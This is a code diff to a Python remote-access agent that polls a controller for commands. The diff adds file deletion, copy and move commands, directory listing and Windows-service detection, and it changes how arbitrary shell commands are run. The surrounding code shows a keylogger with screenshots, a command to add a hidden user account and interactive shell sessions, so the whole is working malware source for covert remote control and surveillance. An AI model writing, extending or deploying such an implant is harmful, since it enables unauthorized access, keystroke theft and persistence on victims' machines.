@@ -12,9 +12,12 @@ import string
 import keyboard
 from threading import Timer
 from datetime import datetime
+from datetime import timezone
 import queue
 import shlex
 import ctypes
+import shlex
+import shutil
 
 import pyautogui
 from io import BytesIO
@@ -218,10 +221,13 @@ class LocalAgent:
 	shellIdCounter = 0
 	sessionsDict = {}
 	currentSessionId = None
+	i_am_a_win_service = False
 
 	def __init__(self):
 		self.daemonUID = self.makeUID();
 		self.isElevated = self.isElevatedWindowsProcess();
+		if str(socket.gethostname().upper() + "$") == getpass.getuser():
+			self.i_am_a_win_service = True
 
 	def makeUID(self):
 		letters = string.ascii_letters
@@ -486,6 +492,28 @@ class LocalAgent:
 				self.postResponse("Mac")
 			else:
 				self.postResponse(platform.system());
+			return None                
+		elif response.startswith("mkdir "):
+			try:
+				os.mkdir(response[6:])
+			except Exception as e:
+				self.postResponse("{}".format(e))        
+			return None		
+		elif response.startswith("rmdir "):
+			try:
+				os.rmdir(response[6:])
+			except Exception as e:
+				self.postResponse("{}".format(e))        
+			return None		
+		elif response.startswith("rm ") or response.startswith("del "):
+			try:
+				if(response.startswith("rm ")):
+					os.remove(response[3:])
+				else:
+					os.remove(response[4:])
+			except Exception as e:
+				self.postResponse("{}".format(e))        
+			return None		
 		elif response.startswith("where "):
 			#We want to run the command with a timeout and cache all IO for a single transmission back to controller
 			try:
@@ -498,6 +526,7 @@ class LocalAgent:
 					self.postResponse("Search complete with no findings")
 				else:    
 					self.postResponse("Cannot execute command {}".format(e))
+			return None
 		elif response == "shell":
 			self.currentSessionId = str(self.shellIdCounter)
 			self.shellIdCounter += 1
@@ -573,8 +602,8 @@ class LocalAgent:
 			return None
 		elif response.startswith("getuid"):
 			username = getpass.getuser()
-			homedir = str(Path.home())
 			hostname = socket.gethostname()
+			homedir = str(Path.home())
 			response_str = "Username: " + username + "\n"
 			response_str = response_str + "Home Directory: " + homedir + "\n"
 			response_str = response_str + "Hostname: " + hostname + "\n"
@@ -614,6 +643,39 @@ class LocalAgent:
 		elif response == 'pwd':
 			self.postResponse(os.getcwd())
 			return None
+		elif response.startswith('cp ') or response.startswith('mv '):#We pair cp and mv b/c the preprocessing is the same
+			args = shlex.split(response)
+			if not len(args) == 3:
+				self.postResponse("Incorrect number of arguments: cp/mv <original> <destination>");
+			else:
+				try:
+					if(args[0] == 'cp'):
+						shutil.copy2(args[1], args[2]) 
+					else:
+						shutil.move(args[1], args[2])
+				except Exception as e:
+					self.postResponse("{}".format(e))        
+			return None            
+		elif response == 'ls' or response.startswith('ls '):
+			try:
+				ls_outcome = "Mode\tLast Write Time\t\tLength\t\tName" + os.linesep
+				path = "."
+				if response.startswith('ls '):
+					path = response[3:]
+				obj = os.scandir(path)
+				for entry in obj:
+					if entry.is_dir():
+						comp_path = os.path.join(path, entry.name)
+						ls_outcome += "d\t" + str(datetime.fromtimestamp(os.path.getmtime(comp_path), tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S")) + "\t" + "\t\t" + entry.name + os.linesep
+				obj = os.scandir(path)
+				for entry in obj:
+					if entry.is_file():
+						comp_path = os.path.join(path, entry.name)
+						ls_outcome += "-\t" + str(datetime.fromtimestamp(os.path.getmtime(comp_path), tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S")) + "\t" + str(os.path.getsize(comp_path)) + "\t\t" + entry.name + os.linesep
+				self.postResponse(ls_outcome)
+			except Exception as e:
+				self.postResponse("{}".format(e))        
+			return None            
 		elif response.startswith('add_hidden_user'):
 			elements = response.split(" ")
 			if not ctypes.windll.shell32.IsUserAnAdmin():
@@ -751,11 +813,18 @@ class LocalAgent:
 		if platform.system() == 'Windows':        
 			logger = Keylogger(60, self, autoScreenshot)
 			logger.start()
+		if self.i_am_a_win_service:
+			self.postResponse("I confess that I am a windows Service")
 		while(live):
 			try:
 				command = self.pollCommand()
 				if command != None:
-					cmd_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8") 
+					use_shell = True
+					if(self.i_am_a_win_service):
+						use_shell = False   
+					cmd_obj = subprocess.Popen(command, shell=use_shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+					cmd_output = cmd_obj.stdout.read().decode("utf-8") 
+					cmd_output += cmd_obj.stderr.read().decode("utf-8") 
 					if self.newLineAfterCmdOutput:
 						cmd_output = cmd_output + "\n"
 					self.postResponse(cmd_output)
